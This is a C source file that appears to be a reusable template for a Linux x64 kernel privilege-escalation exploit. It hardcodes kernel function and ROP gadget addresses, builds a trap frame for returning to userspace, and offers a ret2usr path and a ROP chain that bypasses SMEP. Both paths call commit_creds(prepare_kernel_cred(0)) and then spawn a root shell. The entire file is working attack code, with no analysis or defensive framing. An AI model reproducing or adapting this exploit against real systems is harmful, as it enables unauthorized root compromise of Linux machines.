#include<unistd.h>
#include<sys/mman.h>
#include<errno.h>



//kernel escalate template for x64.

//define critical values
#define commit_creds_addr        (unsigned long)0xffffffff81073f40
#define prepare_kernel_cred_addr (unsigned long)0xffffffff810741f0

//define target mmap address
#define target_mmap_addr         (unsigned long)0x00000000ffff2500

//define gadgets

#define iretq_addr   	         (unsigned long)0xffffffff8158a056 //iretq for x64
#define xchgeax_addr 	         (unsigned long)0 //xchg eax,esp;ret 
#define poprdi_addr  	         (unsigned long)0xffffffff811bfdbd //pop rdi;ret 
#define poprdx_addr  	         (unsigned long)0xffffffff81286be2 //pop rdx;ret
#define xchgebp_addr 	         (unsigned long)0xffffffff81805b39 //xchg ebp, esp; ret 0
#define movrdirax_callrdx_addr   (unsigned long)0xffffffff8107b33b //mov rdi, rax; call rdx
#define swapgs_addr              (unsigned long)0xffffffff8158a38b //swapgs


//define facilities
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void *)KERNCALL = (void*)commit_creds_addr;
void *(*prepare_kernel_cred)(void*) KERNCALL = (void*)prepare_kernel_cred_addr;

struct trap_frame{
	void *rip;
	uint64_t cs;
	uint64_t eflags;
	void *rsp;
	uint64_t ss;
};

struct trap_frame tf;

void prepare_tf(){

	asm("mov rcx, cs;"
		"mov [tf+8], rcx;"
		"pushf;"
		"pop rcx;"
		"mov [tf+16],rcx;"
		"push rsp;"
		"pop rcx;"
		"mov [tf+24], rcx;"
		"mov rcx, ss;"
		"mov [tf+32], rcx;");
	tf.rsp -= 1024;
}

void escalate(){

	commit_creds(prepare_kernel_cred(0));	
//	asm("lea rsp, tf;"
//		"swapgs;"
//		"iretq;");
}

//mmap a rwx region for ROP.
void* allocate(void *addr, size_t size){

	printf("request allocate at : %p\n", addr);
	printf("request size : %lu\n", size);

	void *target_addr = (void*)((unsigned long)addr & 0xffff0000);
	printf("real allocate at: %p\n", target_addr);


	unsigned long *ptr = mmap((void*)target_addr, (size+0x4000), PROT_READ|PROT_WRITE, 	MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); //mmap one more 0x1000 for kernel func stack usage.
	printf("real allocate at: %p\n", ptr);
	printf("will return : %p\n", addr);
	if((void*)((unsigned long)addr & 0xffff0000) != (void*)ptr){
	printf("error!: %s\n",strerror(errno));
	exit(-1);
	}
	return addr;
}

void interactive(){

	execl("/bin/sh", "sh", NULL);
}

//this runs code directly at userspace insteadof rop.
void ret2usr(){

	asm("lea rsp, tf;"
		"swapgs;"
		"iretq;");
}

//under the circumstance no smep enabled.
//if we control kernel rip , just jump here.
//and we will get a root shell.
void usr_escalate(){
	escalate();
	ret2usr();
}

//remote guard: 
//smep && !smap
//use this payload to put rop chain in designed place.
void kernel_rop_escalate(){

	//mmap to target region.
	unsigned long *rop_ptr = (unsigned long*)allocate((unsigned long*)target_mmap_addr, 0x1000);
	//now , set the rop gadgets.
	//first , we need rop to commit_creds.
	*rop_ptr       = (unsigned long)poprdi_addr;
	*(rop_ptr + 1) = (unsigned long)0;
	*(rop_ptr + 2) = prepare_kernel_cred_addr;
	*(rop_ptr + 3) = poprdx_addr;
	*(rop_ptr + 4) = commit_creds_addr + 4;
	*(rop_ptr + 5) = movrdirax_callrdx_addr;
	*(rop_ptr + 6) = swapgs_addr;
	*(rop_ptr + 7) = iretq_addr;
	//set iretq frame
	*(rop_ptr + 8)  = (unsigned long)&interactive;
	*(rop_ptr + 9)  = (unsigned long)tf.cs;
	*(rop_ptr + 10) = (unsigned long)tf.eflags;
	*(rop_ptr + 11) = (unsigned long)tf.rsp;
	*(rop_ptr + 12) = (unsigned long)tf.ss;
}


